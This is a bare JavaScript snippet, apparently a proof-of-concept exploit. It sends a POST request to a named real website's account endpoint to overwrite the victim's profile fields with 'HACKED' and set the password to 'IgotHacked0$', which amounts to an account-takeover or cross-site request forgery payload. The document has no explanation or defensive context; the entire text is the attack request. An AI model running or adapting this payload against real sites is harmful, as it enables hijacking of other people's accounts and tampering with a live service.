fetch('https://www.fdiintelligence.com/api/fdi/my-account', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'firstName=HACKED&lastName=HACKED&password=IgotHacked0$&confirmPassword=IgotHacked0$&country=AL&iso2CountryDialCode=af&dialCode=%2B93&phone=HACKED&jobTitle=HACKED&organisationName=HACKED&organisationType=Government+agency%2Fdepartment&organisationTypeOther='
})
.then(response => response.text())
.then(data => console.log('Response:', data))
.catch(error => console.error('Error:', error));
